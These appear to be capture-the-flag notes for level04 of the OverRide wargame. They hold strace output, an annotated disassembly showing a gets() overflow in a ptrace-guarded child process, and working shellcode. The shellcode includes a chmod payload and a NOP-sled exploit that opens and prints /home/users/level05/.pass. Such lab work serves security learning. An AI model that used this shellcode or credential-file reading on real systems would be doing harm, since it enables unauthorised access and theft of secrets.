level04@OverRide:~$ strace ./level04
execve("./level04", ["./level04"], [/* 20 vars */]) = 0
[ Process PID=1729 runs in 32 bit mode. ]
brk(0)                                  = 0x804b000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7fda000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=23291, ...}) = 0
mmap2(NULL, 23291, PROT_READ, MAP_PRIVATE, 3, 0) = 0xfffffffff7fd4000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib32/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\226\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1717736, ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7fd3000
mmap2(NULL, 1731292, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xfffffffff7e2c000
mprotect(0xf7fcc000, 4096, PROT_NONE)   = 0
mmap2(0xf7fcd000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a0) = 0xfffffffff7fcd000
mmap2(0xf7fd0000, 10972, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7fd0000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7e2b000
set_thread_area(0xffffd580)             = 0
mprotect(0xf7fcd000, 8192, PROT_READ)   = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0xf7ffc000, 4096, PROT_READ)   = 0
munmap(0xf7fd4000, 23291)               = 0
rt_sigaction(SIGALRM, {0x804868f, [ALRM], SA_RESTART}, {SIG_DFL, [], 0}, 8) = 0
alarm(60)                               = 0
clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0) = 1730
wait4(-1, Give me some shellcode, k
   /***********************   1 */ 
   0xffffd67c, 0, NULL)          = ? ERESTARTSYS (To be restarted)
   --- SIGALRM (Alarm clock) @ 0 (0) ---
   _exit(1)                                = ?
   /**********************    2 */
   d
   [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 1655
   --- SIGCHLD (Child exited) @ 0 (0) ---
   fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
   mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7fd9000
   write(1, "child is exiting...\n", 20child is exiting...
   )   = 20
   exit_group(0)                           = ?
   /***********************   3 */
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
   [{WIFSTOPPED(s) && WSTOPSIG(s) == SIGSEGV}], 0, NULL) = 1661
   --- SIGCHLD (Child exited) @ 0 (0) ---
   ptrace(PTRACE_PEEKUSER, 1661, 8*RBX + 4, [0xffffd680ffffffff]) = 0
   wait4(-1, 
   /* we can still type here, prog is waiting */

/*******************************************************************************************************/


Dump of assembler code for function main:
   0x080486c8 <+0>:     push   %ebp
   0x080486c9 <+1>:     mov    %esp,%ebp
   0x080486cb <+3>:     push   %edi
   0x080486cc <+4>:     push   %ebx
   0x080486cd <+5>:     and    $0xfffffff0,%esp
   0x080486d0 <+8>:     sub    $0xb0,%esp                      ; 176
   0x080486d6 <+14>:    call   0x8048550 <fork@plt>            ;  fork
   0x080486db <+19>:    mov    %eax,0xac(%esp)
   0x080486e2 <+26>:    lea    0x20(%esp),%ebx
   0x080486e6 <+30>:    mov    $0x0,%eax
   0x080486eb <+35>:    mov    $0x20,%edx
   0x080486f0 <+40>:    mov    %ebx,%edi
   0x080486f2 <+42>:    mov    %edx,%ecx
   0x080486f4 <+44>:    rep stos %eax,%es:(%edi)
   0x080486f6 <+46>:    movl   $0x0,0xa8(%esp)
   0x08048701 <+57>:    movl   $0x0,0x1c(%esp)
   0x08048709 <+65>:    cmpl   $0x0,0xac(%esp)
   0x08048711 <+73>:    jne    0x8048769 <main+161>            ; jump 161 ne 0
   0x08048713 <+75>:    movl   $0x1,0x4(%esp)
   0x0804871b <+83>:    movl   $0x1,(%esp)
   0x08048722 <+90>:    call   0x8048540 <prctl@plt>           ; prctl
   0x08048727 <+95>:    movl   $0x0,0xc(%esp)
   0x0804872f <+103>:   movl   $0x0,0x8(%esp)
   0x08048737 <+111>:   movl   $0x0,0x4(%esp)
   0x0804873f <+119>:   movl   $0x0,(%esp)
   0x08048746 <+126>:   call   0x8048570 <ptrace@plt>          ; ptrace
   0x0804874b <+131>:   movl   $0x8048903,(%esp)               ; "Give me some shellcode, k"
   0x08048752 <+138>:   call   0x8048500 <puts@plt>            ; puts
   0x08048757 <+143>:   lea    0x20(%esp),%eax                 ; eax    0xffffd720
   0x0804875b <+147>:   mov    %eax,(%esp)
   0x0804875e <+150>:   call   0x80484b0 <gets@plt>            ; gets
   0x08048763 <+155>:   jmp    0x804881a <main+338>            ; jump 338

   0x08048768 <+160>:   nop

   0x08048769 <+161>:   lea    0x1c(%esp),%eax
   0x0804876d <+165>:   mov    %eax,(%esp)
   0x08048770 <+168>:   call   0x80484f0 <wait@plt>            ; wait
   0x08048775 <+173>:   mov    0x1c(%esp),%eax
   0x08048779 <+177>:   mov    %eax,0xa0(%esp)
   0x08048780 <+184>:   mov    0xa0(%esp),%eax
   0x08048787 <+191>:   and    $0x7f,%eax
   0x0804878a <+194>:   test   %eax,%eax
   0x0804878c <+196>:   je     0x80487ac <main+228>             ; jump 228 je  ; puis jump 338
   0x0804878e <+198>:   mov    0x1c(%esp),%eax
   0x08048792 <+202>:   mov    %eax,0xa4(%esp)
   0x08048799 <+209>:   mov    0xa4(%esp),%eax
   0x080487a0 <+216>:   and    $0x7f,%eax
   0x080487a3 <+219>:   add    $0x1,%eax
   0x080487a6 <+222>:   sar    %al
   0x080487a8 <+224>:   test   %al,%al
   0x080487aa <+226>:   jle    0x80487ba <main+242>            ; jump 242 jle
 
   0x080487ac <+228>:   movl   $0x804891d,(%esp)               ; "child is exiting..."
   0x080487b3 <+235>:   call   0x8048500 <puts@plt>            ; puts
   0x080487b8 <+240>:   jmp    0x804881a <main+338>            ; jump 338

   0x080487ba <+242>:   movl   $0x0,0xc(%esp)                  ; 0
   0x080487c2 <+250>:   movl   $0x2c,0x8(%esp)                 ; 44
   0x080487ca <+258>:   mov    0xac(%esp),%eax                 ; 172 le buffer ?
   0x080487d1 <+265>:   mov    %eax,0x4(%esp)
   0x080487d5 <+269>:   movl   $0x3,(%esp)                     ; 3  PTRACE_PEEKUSER ?
   0x080487dc <+276>:   call   0x8048570 <ptrace@plt>          ; ptrace
   0x080487e1 <+281>:   mov    %eax,0xa8(%esp)                 ; 168
   0x080487e8 <+288>:   cmpl   $0xb,0xa8(%esp)                 ; 11
   0x080487f0 <+296>:   jne    0x8048768 <main+160>            ; jump 160 jne 0xb
   0x080487f6 <+302>:   movl   $0x8048931,(%esp)               ; "no exec() for you"
   0x080487fd <+309>:   call   0x8048500 <puts@plt>            ; puts
   0x08048802 <+314>:   movl   $0x9,0x4(%esp)
   0x0804880a <+322>:   mov    0xac(%esp),%eax                 ; 172
   0x08048811 <+329>:   mov    %eax,(%esp)
   0x08048814 <+332>:   call   0x8048520 <kill@plt>            ; kill
   0x08048819 <+337>:   nop

   0x0804881a <+338>:   mov    $0x0,%eax
   0x0804881f <+343>:   lea    -0x8(%ebp),%esp
   0x08048822 <+346>:   pop    %ebx
   0x08048823 <+347>:   pop    %edi
   0x08048824 <+348>:   pop    %ebp
   0x08048825 <+349>:   ret

https://coderstoolbox.net/number/

chmod
https://stackoverflow.com/questions/25096632/how-work-with-chmod-in-assembly-linux-x86
http://shell-storm.org/shellcode/files/shellcode-590.php
\x31\xc0\x31\xdb\x31\xc9\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x66\xb9\xfd\x09\xb0\x0f\xcd\x80\xb0\x01\xcd\x80


open read write
https://github.com/ryaoi/Override42/blob/master/level04/Ressources/shellcode_advanced.asm
python -c 'print "\x90"*4000 + "\xeb\x26\xb0\x05\x5b\x31\xc9\x31\xd2\xcd\x80\x83\xec\x64\x89\xc3\xb0\x03\x89\xe1\xb2\x64\xcd\x80\xb0\x04\xb3\x01\x89\xe1\xb2\x64\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xd5\xff\xff\xff/home/users/level05/.pass"' > /tmp/exploit4k_OpenReadWrite

